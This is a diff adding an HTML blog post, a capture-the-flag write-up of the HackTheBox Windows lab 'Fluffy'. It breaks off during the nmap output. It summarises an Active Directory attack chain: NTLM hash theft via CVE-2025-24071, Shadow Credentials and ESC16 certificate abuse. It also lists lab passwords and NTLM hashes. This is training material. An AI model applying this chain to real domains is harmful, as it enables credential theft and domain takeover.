@@ -1,0 +1,1134 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      HackTheBox: Fluffy &middot; tralsesec
+    
+  </title>
+
+  <!-- CSS -->
+  <!--<link rel="stylesheet" href="public/css/poole.css">-->
+  <!--<link rel="stylesheet" href="public/css/blackdoc.css">-->
+  <link rel="stylesheet" href="/public/css/syntax.css">
+  <link rel="stylesheet" href="/public/css/modern.css">
+  <!--<link rel="stylesheet" href="public/css/operator.css">-->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=EB+Garamond">
+  <!-- Icons -->
+  <link rel="apple-touch-icon" sizes="144x144" href="/public/apple-touch-icon.png">
+  <link rel="shortcut icon" href="/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+</head>
+
+
+  <body>
+
+    <div class="sidebar">
+  <div class="container sidebar-sticky" style="display: flex; flex-direction: column; height: 100%;">
+    
+    <div class="sidebar-about">
+      <h1>
+        <a href="/">
+          tralsesec
+        </a>
+      </h1>
+      <p class="lead">Offensive Security Researcher · Malware Developer & Analyst · Exploit Developer · CTF Player</p>
+    </div>
+
+    <nav class="sidebar-nav">
+      <a class="sidebar-nav-item" href="/">Home</a>
+      <a class="sidebar-nav-item" href="/about">About</a>
+      <a class="sidebar-nav-item" href="/projects">Projects</a>
+      <a class="sidebar-nav-item" href="/anatomy-of-a-bug">Anatomy of a Bug</a>
+      <a class="sidebar-nav-item active" href="/ctfs">Capture the Flags</a>
+
+      <hr style="border: 0; border-top: 1px solid var(--border); margin: 1.5rem 0;">
+
+      <a class="sidebar-nav-item" href="https://x.com/tralsesec" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+        X
+      </a>
+
+      <a class="sidebar-nav-item" href="https://github.com/tralsesec" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+        GitHub
+      </a>
+
+      <a class="sidebar-nav-item" href="https://app.hackthebox.com/public/users/475600" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 24 24"><path d="M11.99 0l-10.4 6.02v12.01l10.4 6.02 10.4-6.02V6.02L11.99 0zM3.46 17.2V6.9l8.53-4.93 8.53 4.93v10.3l-8.53 4.93-8.53-4.93z"/><path d="M11.99 3.5L4.8 7.66v8.32l7.19 4.16 7.19-4.16V7.66L11.99 3.5zm5.72 11.53l-5.72 3.31-5.72-3.31V8.47l5.72-3.31 5.72 3.31v6.56z"/></svg>
+        HackTheBox
+      </a>
+
+    </nav>
+
+    <p style="margin-top: auto; padding-top: 2rem; margin-bottom: 0; font-size: 0.9rem;">
+      &copy; 2026. All rights reserved.
+    </p>
+  </div>
+</div>
+
+
+    <div class="content container">
+      <div class="post">
+  <h1 class="post-title" style="line-height: 1.3; padding-bottom: 1.3rem;">HackTheBox: Fluffy</h1>
+
+  <div class="post-meta" style="font-family: var(--font-mono); font-size: 0.75em; margin-bottom: 2rem;">
+    
+      <div style="display: flex; flex-wrap: wrap; gap: 10px; align-items: center;">
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #WINDOWS
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #CVE-2025-24071
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #SHADOW-CREDENTIALS
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #ESC16
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #ACL-ABUSE
+          </span>
+        
+          <span style="background: rgba(159, 239, 0, 0.05); border: 1px solid rgba(159, 239, 0, 0.2); padding: 2px 8px; border-radius: 2px; color: var(--accent);">
+            #ACTIVE-DIRECTORY
+          </span>
+        
+        <span class="post-date" style="color: var(--fg-dim);">// 2026-05-11</span>
+      </div>
+    
+  </div>
+
+  
+     <div class="intel-frame" style="padding: 5px; background: #000; transition: transform 0.2s ease;">
+      <a href="/assets/img/ctf/fluffy.png" target="_blank" style="border: none; display: block;">
+        <img src="/assets/img/ctf/fluffy.png" style="width: 30%; border-color: #000; display: block; cursor: zoom-in; margin-left: auto; margin-right: auto;">
+      </a>
+    </div>   
+  
+
+  <br><br>
+
+  <h1 id="-fluffy">🎯 Fluffy</h1>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>OS:</strong> Windows</td>
+      <td><strong>Difficulty:</strong> Easy</td>
+      <td><strong>IP:</strong> <code class="language-plaintext highlighter-rouge">10.129.43.160</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="/assets/img/ctf/data/fluffy-htb.png" alt="fluffy.htb" /></p>
+
+<hr />
+
+<h2 id="️-tldr--attack-chain">⛓️ TL;DR / Attack Chain</h2>
+<ol>
+  <li>CVE-2025-24071: Abused <code class="language-plaintext highlighter-rouge">WRITE</code> permission of user <code class="language-plaintext highlighter-rouge">j.fleischman</code> over <code class="language-plaintext highlighter-rouge">IT</code> share in order to upload a malicious <code class="language-plaintext highlighter-rouge">.zip</code> file containing a <code class="language-plaintext highlighter-rouge">.library-ms</code> file that reveals the NTLM hash of <code class="language-plaintext highlighter-rouge">p.agila</code>.</li>
+  <li>GenericAll: User <code class="language-plaintext highlighter-rouge">p.agila</code> is member of <code class="language-plaintext highlighter-rouge">SERVICE ACCOUNT MANAGERS</code> who have <code class="language-plaintext highlighter-rouge">GenericAll</code> over <code class="language-plaintext highlighter-rouge">SERVICE ACCOUNTS</code>, including <code class="language-plaintext highlighter-rouge">CA_SVC</code>. Performed a Shadow Credentials Attack on <code class="language-plaintext highlighter-rouge">CA_SVC</code> in order to get its NTLM hash.</li>
+  <li>ESC16: Escalated privileges from <code class="language-plaintext highlighter-rouge">CA_SVC</code> to Domain Admin abusing the <code class="language-plaintext highlighter-rouge">ESC16</code> certificate misconfiguration.</li>
+</ol>
+
+<hr />
+
+<h2 id="-loot--creds">🔑 Loot &amp; Creds</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">User</th>
+      <th style="text-align: left">Credential</th>
+      <th style="text-align: left">Where / How</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">j.fleischman</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">J0elTHEM4n1990!</code></td>
+      <td style="text-align: left">We start with these credentials</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">p.agila</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">prometheusx-303</code></td>
+      <td style="text-align: left">Cracked NTLM hash retrieved via CVE-2025-24071</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">WINRM_SVC</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">33bd09dcd697600edf6b3a7af4875767</code></td>
+      <td style="text-align: left">Shadow Attack using <code class="language-plaintext highlighter-rouge">p.agila</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">CA_SVC</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ca0f4f9e9eb8a092addf53bb03fc98c8</code></td>
+      <td style="text-align: left">Shadow Attack using <code class="language-plaintext highlighter-rouge">p.agila</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">Administrator</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">8da83a3fa618b6e3a00e93f676c92a6e</code></td>
+      <td style="text-align: left">ESC16 Misconfig Exploitation as <code class="language-plaintext highlighter-rouge">CA_SVC</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="-0-setup--global-variables">🔧 0. Setup &amp; Global Variables</h2>
+<p><em>Run this in your terminal once so you can copy-paste the rest of the commands blindly.</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ IP</span><span class="o">=</span><span class="s2">"10.129.43.160"</span> <span class="p">;</span> <span class="nv">DOMAIN</span><span class="o">=</span><span class="s2">"fluffy.htb"</span> <span class="p">;</span> <span class="nv">USERNAME</span><span class="o">=</span><span class="s2">"j.fleischman"</span> <span class="p">;</span> <span class="nv">PASSWORD</span><span class="o">=</span><span class="s1">'J0elTHEM4n1990!'</span>
+
+<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$IP</span><span class="s2"> </span><span class="nv">$DOMAIN</span><span class="s2"> dc.fluffy.htb DC01.FLUFFY.HTB FLUFFY.HTB dc01.fluffy.htb DC01.fluffy.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-1-enumeration">🔍 1. Enumeration</h2>
+
+<h3 id="nmap">Nmap</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir </span>nmap <span class="o">&amp;&amp;</span> nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nt">-T5</span> <span class="nt">-vv</span> <span class="nv">$IP</span> <span class="nt">-oA</span> ./nmap
+
+Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-05-11 15:23 +0200
+
+&lt;SNIP&gt;
+
+Nmap scan report <span class="k">for </span>fluffy.htb <span class="o">(</span>10.129.43.160<span class="o">)</span>
+Host is up, received echo-reply ttl 127 <span class="o">(</span>0.020s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2026-05-11 15:23:35 CEST <span class="k">for </span>155s
+Not shown: 65516 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2026-05-11 20:24:39Z<span class="o">)</span>
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: fluffy.htb, Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject:
+| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>fluffy-DC01-CA/domainComponent<span class="o">=</span>fluffy
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-04-30T16:09:59
+| Not valid after:  2106-04-30T16:09:59
+| MD5:     f5e3 ec00 5fd1 2a95 a76b 2fd6 4726 4d67
+| SHA-1:   6867 9230 5123 dcf1 9352 e081 4148 7fef 13c7 6c0a
+| SHA-256: a90d f4d0 6fe1 9052 822e 708e 65e8 2c70 24d5 8ef7 692a b346 da07 47d5 d81f 36ee
+| <span class="nt">-----BEGIN</span> CERTIFICATE-----
+| MIIFmjCCBIKgAwIBAgITUAAAABHyG6GZUVLpIQACAAAAETANBgkqhkiG9w0BAQsF
+| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
+| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAgFw0yNjA0MzAxNjA5NTlaGA8yMTA2
+| MDQzMDE2MDk1OVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALvc
+| 1vZo317xTcxldcffWWYLJsYtKuaYnf+etebicPU9eZc55NFzBQyfCM6BWPjbLuDQ
+| 0FFQFnQvYfKCNfX40kuxVKnW9VQm/dSJUfzt2Uz93GYKJEaJlQPDEFTKJdBaJTq1
+| BE13EzR389j8uBPDB+P8sVHSXau1IPspyB+UYWQUt4hGt5hOU6yydjao/d4B8LOl
+| OZGpnKr6ox67GWLqwCfoj8It/vSUN3xeFn3yFDqkI/RNhVF7fiqPYnad1nwycicV
+| tBPYKeOP6ZXFfqJs5lJLsLt8J708//iS28dEXFi4yUog+jNAuGf53QNuTviVbILG
+| SdPVr9IBpNh5zNlM9kkCAwEAAaOCAsMwggK/MDcGCSsGAQQBgjcVBwQqMCgGICsG
+| AQQBgjcVCIfOj3KD0etwhvWLD4Loh37CjReBWwEhAgFuAgEAMDIGA1UdJQQrMCkG
+| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
+| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
+| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFMG/WiZX49X4GWpl
+| oVa+O9XP64DrMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHIBgNV
+| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNBLENO
+| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
+| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZpY2F0
+| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
+| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
+| Q049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
+| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0
+| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
+| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLmZsdWZmeS5odGKCCmZsdWZmeS5o
+| dGKCBkZMVUZGWTANBgkqhkiG9w0BAQsFAAOCAQEATryg0q2I2eVmPNwkxBcsaUFD
+| 0s/p3kv/aOCGB9Wv7TpLP+2WjPRBnGCg9JgrFSL6mvbTyvmftSrxyzGMbbMOyhs5
+| zCJrNE0ewzVeWtkE4HJx4P1rbrR1DvTmoZPKZ5y0NTQGCeHzM9vR8nVnFtMByHpG
+| /F3ReiaILeHnvRDVNjyd/uDkOu+mYNZ9k7kZLvMynM55YfizS6ZLXSqqVtLzUJev
+| l3szUURWnNtESHGkGrrclYaWakB3CO1ygkTTjV5O1UNj2V38wN8wgNX7Pys771PQ
+| mmZJw5lCPljYhiN3Rh/8vUlg6IQlJEsyAJL1Y9MuaTJOuyf2PZPCJURtKhgdiA<span class="o">==</span>
+|_-----END CERTIFICATE-----
+|_ssl-date: 2026-05-11T20:26:08+00:00<span class="p">;</span> +6h59m58s from scanner time.
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+464/tcp   open  kpasswd5?     syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: fluffy.htb, Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject:
+| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>fluffy-DC01-CA/domainComponent<span class="o">=</span>fluffy
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-04-30T16:09:59
+| Not valid after:  2106-04-30T16:09:59
+| MD5:     f5e3 ec00 5fd1 2a95 a76b 2fd6 4726 4d67
+| SHA-1:   6867 9230 5123 dcf1 9352 e081 4148 7fef 13c7 6c0a
+| SHA-256: a90d f4d0 6fe1 9052 822e 708e 65e8 2c70 24d5 8ef7 692a b346 da07 47d5 d81f 36ee
+| <span class="nt">-----BEGIN</span> CERTIFICATE-----
+| MIIFmjCCBIKgAwIBAgITUAAAABHyG6GZUVLpIQACAAAAETANBgkqhkiG9w0BAQsF
+| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
+| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAgFw0yNjA0MzAxNjA5NTlaGA8yMTA2
+| MDQzMDE2MDk1OVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALvc
+| 1vZo317xTcxldcffWWYLJsYtKuaYnf+etebicPU9eZc55NFzBQyfCM6BWPjbLuDQ
+| 0FFQFnQvYfKCNfX40kuxVKnW9VQm/dSJUfzt2Uz93GYKJEaJlQPDEFTKJdBaJTq1
+| BE13EzR389j8uBPDB+P8sVHSXau1IPspyB+UYWQUt4hGt5hOU6yydjao/d4B8LOl
+| OZGpnKr6ox67GWLqwCfoj8It/vSUN3xeFn3yFDqkI/RNhVF7fiqPYnad1nwycicV
+| tBPYKeOP6ZXFfqJs5lJLsLt8J708//iS28dEXFi4yUog+jNAuGf53QNuTviVbILG
+| SdPVr9IBpNh5zNlM9kkCAwEAAaOCAsMwggK/MDcGCSsGAQQBgjcVBwQqMCgGICsG
+| AQQBgjcVCIfOj3KD0etwhvWLD4Loh37CjReBWwEhAgFuAgEAMDIGA1UdJQQrMCkG
+| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
+| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
+| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFMG/WiZX49X4GWpl
+| oVa+O9XP64DrMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHIBgNV
+| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNBLENO
+| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
+| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZpY2F0
+| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
+| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
+| Q049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
+| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0
+| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
+| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLmZsdWZmeS5odGKCCmZsdWZmeS5o
+| dGKCBkZMVUZGWTANBgkqhkiG9w0BAQsFAAOCAQEATryg0q2I2eVmPNwkxBcsaUFD
+| 0s/p3kv/aOCGB9Wv7TpLP+2WjPRBnGCg9JgrFSL6mvbTyvmftSrxyzGMbbMOyhs5
+| zCJrNE0ewzVeWtkE4HJx4P1rbrR1DvTmoZPKZ5y0NTQGCeHzM9vR8nVnFtMByHpG
+| /F3ReiaILeHnvRDVNjyd/uDkOu+mYNZ9k7kZLvMynM55YfizS6ZLXSqqVtLzUJev
+| l3szUURWnNtESHGkGrrclYaWakB3CO1ygkTTjV5O1UNj2V38wN8wgNX7Pys771PQ
+| mmZJw5lCPljYhiN3Rh/8vUlg6IQlJEsyAJL1Y9MuaTJOuyf2PZPCJURtKhgdiA<span class="o">==</span>
+|_-----END CERTIFICATE-----
+|_ssl-date: 2026-05-11T20:26:08+00:00<span class="p">;</span> +6h59m58s from scanner time.
+3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: fluffy.htb, Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject:
+| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>fluffy-DC01-CA/domainComponent<span class="o">=</span>fluffy
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-04-30T16:09:59
+| Not valid after:  2106-04-30T16:09:59
+| MD5:     f5e3 ec00 5fd1 2a95 a76b 2fd6 4726 4d67
+| SHA-1:   6867 9230 5123 dcf1 9352 e081 4148 7fef 13c7 6c0a
+| SHA-256: a90d f4d0 6fe1 9052 822e 708e 65e8 2c70 24d5 8ef7 692a b346 da07 47d5 d81f 36ee
+| <span class="nt">-----BEGIN</span> CERTIFICATE-----
+| MIIFmjCCBIKgAwIBAgITUAAAABHyG6GZUVLpIQACAAAAETANBgkqhkiG9w0BAQsF
+| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
+| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAgFw0yNjA0MzAxNjA5NTlaGA8yMTA2
+| MDQzMDE2MDk1OVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALvc
+| 1vZo317xTcxldcffWWYLJsYtKuaYnf+etebicPU9eZc55NFzBQyfCM6BWPjbLuDQ
+| 0FFQFnQvYfKCNfX40kuxVKnW9VQm/dSJUfzt2Uz93GYKJEaJlQPDEFTKJdBaJTq1
+| BE13EzR389j8uBPDB+P8sVHSXau1IPspyB+UYWQUt4hGt5hOU6yydjao/d4B8LOl
+| OZGpnKr6ox67GWLqwCfoj8It/vSUN3xeFn3yFDqkI/RNhVF7fiqPYnad1nwycicV
+| tBPYKeOP6ZXFfqJs5lJLsLt8J708//iS28dEXFi4yUog+jNAuGf53QNuTviVbILG
+| SdPVr9IBpNh5zNlM9kkCAwEAAaOCAsMwggK/MDcGCSsGAQQBgjcVBwQqMCgGICsG
+| AQQBgjcVCIfOj3KD0etwhvWLD4Loh37CjReBWwEhAgFuAgEAMDIGA1UdJQQrMCkG
+| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
+| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
+| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFMG/WiZX49X4GWpl
+| oVa+O9XP64DrMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHIBgNV
+| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNBLENO
+| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
+| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZpY2F0
+| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
+| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
+| Q049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
+| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0
+| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
+| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLmZsdWZmeS5odGKCCmZsdWZmeS5o
+| dGKCBkZMVUZGWTANBgkqhkiG9w0BAQsFAAOCAQEATryg0q2I2eVmPNwkxBcsaUFD
+| 0s/p3kv/aOCGB9Wv7TpLP+2WjPRBnGCg9JgrFSL6mvbTyvmftSrxyzGMbbMOyhs5
+| zCJrNE0ewzVeWtkE4HJx4P1rbrR1DvTmoZPKZ5y0NTQGCeHzM9vR8nVnFtMByHpG
+| /F3ReiaILeHnvRDVNjyd/uDkOu+mYNZ9k7kZLvMynM55YfizS6ZLXSqqVtLzUJev
+| l3szUURWnNtESHGkGrrclYaWakB3CO1ygkTTjV5O1UNj2V38wN8wgNX7Pys771PQ
+| mmZJw5lCPljYhiN3Rh/8vUlg6IQlJEsyAJL1Y9MuaTJOuyf2PZPCJURtKhgdiA<span class="o">==</span>
+|_-----END CERTIFICATE-----
+|_ssl-date: 2026-05-11T20:26:08+00:00<span class="p">;</span> +6h59m58s from scanner time.
+3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: fluffy.htb, Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject:
+| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>fluffy-DC01-CA/domainComponent<span class="o">=</span>fluffy
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-04-30T16:09:59
+| Not valid after:  2106-04-30T16:09:59
+| MD5:     f5e3 ec00 5fd1 2a95 a76b 2fd6 4726 4d67
+| SHA-1:   6867 9230 5123 dcf1 9352 e081 4148 7fef 13c7 6c0a
+| SHA-256: a90d f4d0 6fe1 9052 822e 708e 65e8 2c70 24d5 8ef7 692a b346 da07 47d5 d81f 36ee
+| <span class="nt">-----BEGIN</span> CERTIFICATE-----
+| MIIFmjCCBIKgAwIBAgITUAAAABHyG6GZUVLpIQACAAAAETANBgkqhkiG9w0BAQsF
+| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
+| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAgFw0yNjA0MzAxNjA5NTlaGA8yMTA2
+| MDQzMDE2MDk1OVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALvc
+| 1vZo317xTcxldcffWWYLJsYtKuaYnf+etebicPU9eZc55NFzBQyfCM6BWPjbLuDQ
+| 0FFQFnQvYfKCNfX40kuxVKnW9VQm/dSJUfzt2Uz93GYKJEaJlQPDEFTKJdBaJTq1
+| BE13EzR389j8uBPDB+P8sVHSXau1IPspyB+UYWQUt4hGt5hOU6yydjao/d4B8LOl
+| OZGpnKr6ox67GWLqwCfoj8It/vSUN3xeFn3yFDqkI/RNhVF7fiqPYnad1nwycicV
+| tBPYKeOP6ZXFfqJs5lJLsLt8J708//iS28dEXFi4yUog+jNAuGf53QNuTviVbILG
